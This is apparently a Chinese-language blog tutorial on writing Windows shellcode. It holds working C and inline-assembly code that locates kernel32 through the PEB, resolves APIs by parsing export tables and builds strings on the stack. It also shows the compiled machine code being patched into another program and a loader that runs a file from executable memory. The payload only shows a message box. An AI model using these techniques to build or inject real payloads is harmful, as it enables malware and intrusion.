    <content type="html"><![CDATA[<h3 id="shellcode学习"><a href="#shellcode学习" class="headerlink" title="shellcode学习"></a>shellcode学习</h3><h4 id="编译器的一些设置"><a href="#编译器的一些设置" class="headerlink" title="编译器的一些设置"></a>编译器的一些设置</h4><h5 id="第一步修改入口点"><a href="#第一步修改入口点" class="headerlink" title="第一步修改入口点"></a>第一步修改入口点</h5><p>在编译器中修改程序的入口点，写代码时就可以使用新的入口点名</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/1.png"></p><p>修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/2.png"></p><h5 id="第二步关闭缓冲区安全检查"><a href="#第二步关闭缓冲区安全检查" class="headerlink" title="第二步关闭缓冲区安全检查"></a>第二步关闭缓冲区安全检查</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/3.png"></p><p>然后查看IDA，左边函数只剩一个了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/4.png"></p><h5 id="第三步设置工程兼容XP"><a href="#第三步设置工程兼容XP" class="headerlink" title="第三步设置工程兼容XP"></a>第三步设置工程兼容XP</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/5.png"></p><p>修改运行库为MT</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/6.png"></p><h5 id="第四步关闭生成清单"><a href="#第四步关闭生成清单" class="headerlink" title="第四步关闭生成清单"></a>第四步关闭生成清单</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/7.png"></p><p>使用loadpe查看看到只有两个区段</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/8.png"></p><h5 id="第五步关闭调试信息"><a href="#第五步关闭调试信息" class="headerlink" title="第五步关闭调试信息"></a>第五步关闭调试信息</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/9.png"></p><h4 id="shellcode编写原则1"><a href="#shellcode编写原则1" class="headerlink" title="shellcode编写原则1"></a>shellcode编写原则1</h4><ul><li>杜绝双引号字符串的直接使用</li><li>关闭VS自动优化没有使用到的变量</li><li>自定义函数入口</li></ul><p>#pragma comment(linker,”/entry:EntryMain”)</p><h4 id="shellcode编写原则2"><a href="#shellcode编写原则2" class="headerlink" title="shellcode编写原则2"></a>shellcode编写原则2</h4><p>动态获取函数地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:EntryMain&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EntryMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* FN_MessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            __in_opt HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">            __in_opt LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">            __in_opt LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">            __in UINT uType)</span></span>;</span><br><span class="line">    FN_MessageBoxA fn_MessageBoxA;</span><br><span class="line">    fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    fn_MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;b1ackie&quot;</span>, <span class="string">&quot;hhh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="shellcode编写原则3"><a href="#shellcode编写原则3" class="headerlink" title="shellcode编写原则3"></a>shellcode编写原则3</h4><p>获取kernel32.dll基址和GetProcAddress地址获取。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:EntryMain&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ucrtd.lib&quot;</span>) </span></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;msvcrtd.lib&quot;) </span></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;vcruntimed.lib&quot;) </span></span><br><span class="line">_declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span> </span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax, fs: [<span class="number">30</span>h]<span class="comment">//获取PEB</span></span><br><span class="line">mov eax, [eax + <span class="number">0</span>Ch]<span class="comment">//获取_PEB_LDR_DATA</span></span><br><span class="line">mov eax, [eax + <span class="number">14</span>h]<span class="comment">//InMemoryOrderModuleList，</span></span><br><span class="line">mov eax, [eax]<span class="comment">//程序自身</span></span><br><span class="line">mov eax, [eax]<span class="comment">//ntdll.dll</span></span><br><span class="line">mov eax,[eax+<span class="number">10</span>h]<span class="comment">//kernel.dll,偏移10H是地址</span></span><br><span class="line">ret </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModule) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + </span><br><span class="line">(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);</span><br><span class="line">PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);</span><br><span class="line">DWORD dwNumber = lpExport-&gt;NumberOfNames;</span><br><span class="line">DWORD wHint = <span class="number">0</span>;</span><br><span class="line">FARPROC lpFunc;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwNumber; i++) &#123;</span><br><span class="line"><span class="keyword">char</span> *lpFuncName = (<span class="keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);</span><br><span class="line"><span class="keyword">if</span> (lpFuncName[<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">3</span>] == <span class="string">&#x27;P&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">4</span>] == <span class="string">&#x27;r&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">5</span>] == <span class="string">&#x27;o&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">7</span>] == <span class="string">&#x27;A&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">8</span>] == <span class="string">&#x27;d&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">9</span>] == <span class="string">&#x27;d&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">10</span>] == <span class="string">&#x27;r&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">11</span>] == <span class="string">&#x27;e&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">12</span>] == <span class="string">&#x27;s&#x27;</span>&amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">13</span>] == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">wHint = lpAddressOfNameOrdinalArray[i];</span><br><span class="line">lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> lpFunc;</span><br><span class="line"><span class="comment">//PWORD </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EntryMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HMODULE hAddr = (HMODULE)getKernel32();</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* FN_GetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">FN_GetProcAddress fn_GetProcAddress;</span><br><span class="line">fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="shellcode编写原则4"><a href="#shellcode编写原则4" class="headerlink" title="shellcode编写原则4"></a>shellcode编写原则4</h4><ul><li><p>避免全局变量的使用</p></li><li><p>确保已加载所使用的API的动态链接库</p></li></ul><h4 id="第一种shellcode生成框架"><a href="#第一种shellcode生成框架" class="headerlink" title="第一种shellcode生成框架"></a>第一种shellcode生成框架</h4><p>通过上述操作直接编写，编写一个拥有弹窗功能的shellcode</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span>;</span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModule);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EntryMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HMODULE hAddr = (HMODULE)getKernel32();</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* FN_GetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">FN_GetProcAddress fn_GetProcAddress;</span><br><span class="line">fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* FN_LoadLibraryA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPCSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="keyword">char</span> szLoadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);</span><br><span class="line"><span class="keyword">char</span> szMessageBoxA[] = &#123; <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(WINAPI* FN_MessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uType)</span></span>;</span><br><span class="line"><span class="keyword">char</span> szUser32[] = &#123; <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA);</span><br><span class="line"><span class="keyword">char</span> szHello[] = &#123; <span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> szTitle[] = &#123; <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">fn_MessageBoxA(<span class="literal">NULL</span>, szHello, szTitle, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">_declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span> </span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax, fs: [<span class="number">30</span>h]<span class="comment">//获取PEB</span></span><br><span class="line">mov eax, [eax + <span class="number">0</span>Ch]<span class="comment">//获取_PEB_LDR_DATA</span></span><br><span class="line">mov eax, [eax + <span class="number">14</span>h]<span class="comment">//InMemoryOrderModuleList，</span></span><br><span class="line">mov eax, [eax]<span class="comment">//程序自身</span></span><br><span class="line">mov eax, [eax]<span class="comment">//ntdll.dll</span></span><br><span class="line">mov eax, [eax + <span class="number">10</span>h]<span class="comment">//kernel.dll,偏移10H是地址</span></span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModule) &#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +</span><br><span class="line">(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);</span><br><span class="line">PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);</span><br><span class="line">DWORD dwNumber = lpExport-&gt;NumberOfNames;</span><br><span class="line">DWORD wHint = <span class="number">0</span>;</span><br><span class="line">FARPROC lpFunc;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwNumber; i++) &#123;</span><br><span class="line"><span class="keyword">char</span>* lpFuncName = (<span class="keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);</span><br><span class="line"><span class="keyword">if</span> (lpFuncName[<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">3</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">4</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">5</span>] == <span class="string">&#x27;o&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">7</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">8</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">9</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">10</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">11</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">12</span>] == <span class="string">&#x27;s&#x27;</span> &amp;&amp;</span><br><span class="line">lpFuncName[<span class="number">13</span>] == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">wHint = lpAddressOfNameOrdinalArray[i];</span><br><span class="line">lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> lpFunc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用PEID查看偏移，可以看到是200,</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/10.png"></p><p>然后使用十六进制编辑器将其中的机器码拷贝出来。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/11.png"></p><p>选取一个替代的程序，查看其偏移</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/12.png"></p><p>然后进入编辑器，从偏移开始粘贴我们的机器码</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/13.png"></p><p>然后打开这个程序就会实现shellcode编写的弹窗效果了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/14.png"></p><h4 id="第二种shellcode生成框架"><a href="#第二种shellcode生成框架" class="headerlink" title="第二种shellcode生成框架"></a>第二种shellcode生成框架</h4><h5 id="单文件的函数生成位置规律"><a href="#单文件的函数生成位置规律" class="headerlink" title="单文件的函数生成位置规律"></a>单文件的函数生成位置规律</h5><p>单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。</p><p>如这样一个程序，定义的顺序是先A，后B</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/15.png"></p><p>在IDA中可以看到顺序是先B后A。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/16.png"></p><h5 id="多文件生成规律"><a href="#多文件生成规律" class="headerlink" title="多文件生成规律"></a>多文件生成规律</h5><p>与包含的文件位置无关，与实际调用顺序有关。</p><p>在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/17.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/18.png"></p><p>修改一下顺序，编译顺序也会改变</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/19.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/20.png"></p><h5 id="实际编写"><a href="#实际编写" class="headerlink" title="实际编写"></a>实际编写</h5><p>在其中定义几个文件</p><ul><li>0.entry.cpp：入口点</li><li>a.start.cpp：shellcode执行</li><li>z.end.cpp：shellcode结束</li></ul><p>a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hBin = <span class="built_in">CreateFileA</span>(<span class="string">&quot;sh.bin&quot;</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="built_in">WriteFile</span>(hBin, ShellcodeStart, dwSize, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hBin);</span><br></pre></td></tr></table></figure><h5 id="shellcode加载器"><a href="#shellcode加载器" class="headerlink" title="shellcode加载器"></a>shellcode加载器</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(argv[<span class="number">1</span>], GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwSize;</span><br><span class="line">dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">LPVOID lpAddr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;virtual failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, lpAddr, dwSize, &amp;dwRead, <span class="number">0</span>);</span><br><span class="line">__asm &#123;</span><br><span class="line">call lpAddr</span><br><span class="line">&#125;</span><br><span class="line">_flushall();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/21.png"></p>]]></content>
    
    
      
      
